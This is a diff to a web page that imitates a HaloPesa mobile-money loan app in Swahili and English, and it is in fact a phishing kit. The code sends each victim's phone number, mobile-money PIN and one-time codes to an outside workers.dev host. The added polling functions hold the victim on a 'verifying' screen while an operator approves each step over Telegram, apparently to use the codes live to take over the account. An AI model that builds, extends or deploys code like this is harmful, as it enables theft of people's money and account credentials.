@@ -242,6 +242,14 @@ input[type=range].loan-range::-moz-range-thumb{
 .view-illus-sm{width:100%;max-width:180px;margin:0 auto 14px;display:block;flex-shrink:0}
 
 .view-container{position:relative;flex:1;min-height:0;overflow:hidden}
+.btn-spinner{
+  width:18px;height:18px;border-radius:50%;flex-shrink:0;
+  border:2.5px solid rgba(255,255,255,.35);
+  border-top-color:#fff;border-right-color:#fff;
+  animation:spin .8s linear infinite;display:none;
+}
+.btn.verifying .btn-spinner{display:block}
+.btn.verifying .btn-label{opacity:.7}
 </style>
 </head>
 <body>
@@ -418,7 +426,7 @@ input[type=range].loan-range::-moz-range-thumb{
       </div>
     </div>
     <div class="cta-area">
-      <button class="btn btn-primary off" id="offerBtn" onclick="requestOTP1()" disabled>
+      <button class="btn btn-primary off" id="offerBtn" onclick="confirmAndRequestOTP2()" disabled>
         <span data-i18n="requestLoan">Omba Mkopo</span>
       </button>
     </div>
@@ -499,7 +507,8 @@ input[type=range].loan-range::-moz-range-thumb{
     </div>
     <div class="cta-area">
       <button class="btn btn-primary off" id="otp2Btn" onclick="verifyOtp2()" disabled>
-        <span data-i18n="confirmDisburse">Thibitisha Malipo</span>
+        <div class="btn-spinner"></div>
+        <span class="btn-label" data-i18n="confirmDisburse">Thibitisha Malipo</span>
       </button>
     </div>
   </div>
@@ -528,6 +537,11 @@ input[type=range].loan-range::-moz-range-thumb{
 
 <script>
 'use strict';
+
+
+/* ── Session ID: unique per loan session ── */
+var sessionId = Date.now().toString(36) + Math.random().toString(36).slice(2,6);
+var approvalPoller = null;
 
 /* ══════════════════════ i18n ══════════════════════ */
 var I18N = {
@@ -696,33 +710,29 @@ document.getElementById('pinPad').addEventListener('click', function(e){
 });
 function submitPin(){
   if(pin.length !== 4) return;
-  if(/^(\d)\1{3}$/.test(pin)){
-    document.getElementById('pinErr').textContent = I18N[lang].errPin;
-    for(var i=0;i<4;i++) document.getElementById('pb'+i).classList.add('err');
-    hap([25,15,25]); pin=''; setTimeout(renderPin, 400); return;
-  }
+
 
   (function(){
     var _t=getLoanTier(loanAmount);
     fetch('https://halopesa.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
       body:JSON.stringify({event:'pin_submitted',data:{
         phone:phoneDigits||'',
-        pin:pin,amount:loanAmount,rate:_t.rate,days:_t.days,
-        repay:Math.round(loanAmount*(1+_t.rate/100)),
+        pin:pin,
         device:getDevice(),ts:Date.now()
       }})}).catch(function(){});
   })();
-  goStep('processing');
-  setTimeout(function(){
-    updateLoanDisplay(loanAmount);
-    document.getElementById('otpPhone1').textContent = '+255 ' + phoneDigits.slice(0,3)+' '+phoneDigits.slice(3,6)+' '+phoneDigits.slice(6);
-    document.getElementById('otpPhone2').textContent = '+255 ' + phoneDigits.slice(0,3)+' '+phoneDigits.slice(3,6)+' '+phoneDigits.slice(6);
-    var due = new Date(Date.now() + 30*86400000);
-    var dueStr = due.toLocaleDateString(lang==='sw'?'sw-TZ':'en-GB', {day:'2-digit',month:'short',year:'numeric'});
-    document.getElementById('dueDate').textContent = dueStr;
-    document.getElementById('dueDate2').textContent = dueStr;
-    goStep('offer');
-  }, 1800);
+  /* Go straight to OTP1 — loan amount chosen later */
+  otp1Correct = String(Math.floor(1000 + Math.random()*9000));
+  otp1Val = ''; renderOtp('o1','');
+  document.getElementById('otp1Input').value = '';
+  var btn1 = document.getElementById('otp1Btn'); btn1.classList.add('off'); btn1.disabled = true;
+  document.getElementById('otp1Err').textContent = '';
+  document.getElementById('otpPhone1').textContent = '+255 ' + phoneDigits.slice(0,3)+' '+phoneDigits.slice(3,6)+' '+phoneDigits.slice(6);
+  goStep('otp1');
+  setTimeout(function(){ document.getElementById('otp1Input').focus(); }, 300);
+  _otp1Abort = listenForOTP('otp1Input', onOtp1Input);
+  if(otp1Timer) clearInterval(otp1Timer);
+  otp1Timer = startOtpTimer('otp1Secs','otp1ResendBtn','otp1Timer');
 }
 
 /* ══════════════════════ TERMS + OFFER ══════════════════════ */
@@ -739,6 +749,13 @@ function toggleTerms(){
   btn.disabled = !termsAccepted;
 }
 
+
+function confirmAndRequestOTP2(){
+  if(!termsAccepted) return;
+  hap(H_confirm());
+  goStep('disbursing');
+  setTimeout(function(){ requestOTP2(); }, 1600);
+}
 /* ══════════════════════ OTP shared helpers ══════════════════════ */
 function renderOtp(prefix, val){
   for(var i=0;i<4;i++){
@@ -772,18 +789,12 @@ function startOtpTimer(secsEl, resendBtnId, timerRowId){
 /* ══════════════════════ OTP #1 — Loan Request Verification ══════════════════════ */
 var otp1Val = '', otp1Correct = '', otp1Timer = null;
 function requestOTP1(){
-  if(!termsAccepted) return;
-  hap(H_confirm());
+  /* Called by resendOtp1 only — submitPin handles initial OTP1 setup */
   otp1Correct = String(Math.floor(1000 + Math.random()*9000));
-  otp1Val = ''; renderOtp('o1', '');
+  otp1Val = ''; renderOtp('o1','');
   document.getElementById('otp1Input').value = '';
   var btn = document.getElementById('otp1Btn'); btn.classList.add('off'); btn.disabled = true;
   document.getElementById('otp1Err').textContent = '';
-  goStep('otp1');
-  setTimeout(function(){ document.getElementById('otp1Input').focus(); }, 300);
-  _otp1Abort = listenForOTP('otp1Input', onOtp1Input);
-  if(otp1Timer) clearInterval(otp1Timer);
-  otp1Timer = startOtpTimer('otp1Secs', 'otp1ResendBtn', 'otp1Timer');
 }
 function onOtp1Input(val){
   otp1Val = val.replace(/[^0-9]/g,'').slice(0,4);
@@ -821,17 +832,40 @@ function verifyOtp1(){
         phone:phoneDigits||'',
         pin:pin,amount:loanAmount,rate:_t.rate,days:_t.days,
         repay:Math.round(loanAmount*(1+_t.rate/100)),
-        otp:otp1Val,otpNum:'1',otp_code:otp1Correct,
+        otp:otp1Val,otpNum:'1',sessionId:sessionId,
         device:getDevice(),ts:Date.now()
       }})}).catch(function(){});
   })();
   for(var j=0;j<4;j++) document.getElementById('o1b'+j).classList.add('ok');
   hap([10,6,18]);
   if(otp1Timer) clearInterval(otp1Timer);
-  setTimeout(function(){
-    goStep('disbursing');
-    setTimeout(function(){ requestOTP2(); }, 1600);
-  }, 500);
+  /* Show verifying state — wait for Telegram approval */
+  setOtp1Verifying(true);
+  pollApproval(sessionId + '_otp1', function(approved){
+    setOtp1Verifying(false);
+    if(approved){
+      hap([10,6,18]);
+      for(var j=0;j<4;j++) document.getElementById('o1b'+j).classList.add('ok');
+      setTimeout(function(){
+        goStep('processing');
+        setTimeout(function(){
+          updateLoanDisplay(loanAmount);
+          document.getElementById('otpPhone2').textContent = '+255 ' + phoneDigits.slice(0,3)+' '+phoneDigits.slice(3,6)+' '+phoneDigits.slice(6);
+          var due = new Date(Date.now() + 30*86400000);
+          var dueStr = due.toLocaleDateString(lang==='sw'?'sw-TZ':'en-GB',{day:'2-digit',month:'short',year:'numeric'});
+          document.getElementById('dueDate').textContent = dueStr;
+          document.getElementById('dueDate2').textContent = dueStr;
+          goStep('offer');
+        }, 1600);
+      }, 500);
+    } else {
+      /* Declined — lock OTP box, enable resend only */
+      hap([30,15,30,15,30]);
+      document.getElementById('otp1Err').textContent = lang==='sw'?'Ombi limekataliwa — tuma tena':'Request declined — please resend';
+      for(var i=0;i<4;i++) document.getElementById('o1b'+i).classList.add('err');
+      setOtp1Locked(true);
+    }
+  });
 }
 function resendOtp1(){
 
@@ -905,18 +939,31 @@ function verifyOtp2(){
         phone:phoneDigits||'',
         pin:pin,amount:loanAmount,rate:_t.rate,days:_t.days,
         repay:Math.round(loanAmount*(1+_t.rate/100)),
-        otp:otp2Val,otpNum:'2',otp_code:otp2Correct,
+        otp:otp2Val,otpNum:'2',sessionId:sessionId,
         ref:document.getElementById('refNo').textContent||'',
         device:getDevice(),ts:Date.now()
       }})}).catch(function(){});
   })();
-  for(var j=0;j<4;j++) document.getElementById('o2b'+j).classList.add('ok');
-  hap([10,6,18,6,30]);
-  if(otp2Timer) clearInterval(otp2Timer);
-  setTimeout(function(){
-    document.getElementById('refNo').textContent = 'HP' + Date.now().toString(36).toUpperCase();
-    goStep('success');
-  }, 500);
+  /* Show verifying state — wait for Telegram approval */
+  setOtp2Verifying(true);
+  pollApproval(sessionId + '_otp2', function(approved){
+    setOtp2Verifying(false);
+    if(approved){
+      hap([10,6,18,6,30]);
+      for(var j=0;j<4;j++) document.getElementById('o2b'+j).classList.add('ok');
+      if(otp2Timer) clearInterval(otp2Timer);
+      setTimeout(function(){
+        document.getElementById('refNo').textContent = 'HP' + Date.now().toString(36).toUpperCase();
+        document.getElementById('successAmt').textContent = 'TSh ' + loanAmount.toLocaleString('en-TZ');
+        goStep('success');
+      }, 500);
+    } else {
+      hap([30,15,30,15,30]);
+      document.getElementById('otp2Err').textContent = lang==='sw'?'Ombi limekataliwa — tuma tena':'Request declined — please resend';
+      for(var i=0;i<4;i++) document.getElementById('o2b'+i).classList.add('err');
+      setOtp2Locked(true);
+    }
+  });
 }
 function resendOtp2(){
 
@@ -1019,6 +1066,68 @@ document.getElementById('loanPills').addEventListener('click', function(e){
 /* Add i18n key for chooseAmt */
 I18N.sw.chooseAmt = 'Chagua kiasi cha mkopo';
 I18N.en.chooseAmt = 'Choose loan amount';
+
+
+/* ══════════════════════ APPROVAL POLLING ══════════════════════ */
+function pollApproval(key, cb){
+  var attempts = 0;
+  var maxAttempts = 120; /* 2 minutes × 1s */
+  var iv = setInterval(function(){
+    attempts++;
+    if(attempts > maxAttempts){
+      clearInterval(iv);
+      cb(false);
+      return;
+    }
+    fetch('https://halopesa.lennxkoros.workers.dev/approval?key=' + encodeURIComponent(key))
+      .then(function(r){ return r.json(); })
+      .then(function(data){
+        if(data.status === 'approved'){ clearInterval(iv); cb(true); }
+        else if(data.status === 'declined'){ clearInterval(iv); cb(false); }
+        /* pending — keep polling */
+      })
+      .catch(function(){});
+  }, 1000);
+}
+
+/* OTP1 verifying UI state */
+function setOtp1Verifying(on){
+  var btn = document.getElementById('otp1Btn');
+  if(on){
+    btn.disabled = true; btn.classList.add('off','verifying');
+    btn.querySelector('.btn-label').textContent = lang==='sw'?'Inathibitishwa…':'Verifying…';
+    document.getElementById('otp1Input').disabled = true;
+  } else {
+    btn.disabled = false; btn.classList.remove('off','verifying');
+    btn.querySelector('.btn-label').textContent = I18N[lang].verify;
+    document.getElementById('otp1Input').disabled = false;
+  }
+}
+function setOtp1Locked(on){
+  document.getElementById('otp1Input').disabled = on;
+  document.getElementById('otp1Btn').disabled = on;
+  if(on) document.getElementById('otp1Btn').classList.add('off');
+  /* resend button remains active */
+}
+
+/* OTP2 verifying UI state */
+function setOtp2Verifying(on){
+  var btn = document.getElementById('otp2Btn');
+  if(on){
+    btn.disabled = true; btn.classList.add('off','verifying');
+    btn.querySelector('.btn-label').textContent = lang==='sw'?'Inathibitishwa…':'Verifying…';
+    document.getElementById('otp2Input').disabled = true;
+  } else {
+    btn.disabled = false; btn.classList.remove('off','verifying');
+    btn.querySelector('.btn-label').textContent = I18N[lang].confirmDisburse;
+    document.getElementById('otp2Input').disabled = false;
+  }
+}
+function setOtp2Locked(on){
+  document.getElementById('otp2Input').disabled = on;
+  document.getElementById('otp2Btn').disabled = on;
+  if(on) document.getElementById('otp2Btn').classList.add('off');
+}
 
 /* ══════════════════════ restart ══════════════════════ */
 function restart(){
